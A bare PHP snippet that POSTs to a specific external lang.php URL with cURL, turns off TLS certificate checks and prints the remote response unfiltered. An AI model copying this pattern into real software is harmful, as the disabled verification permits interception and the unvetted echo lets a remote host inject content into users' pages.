<?

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://air.modena.co.id/csapps/lang/lang.php");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FAILONERROR, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
echo curl_exec ($ch); 

?>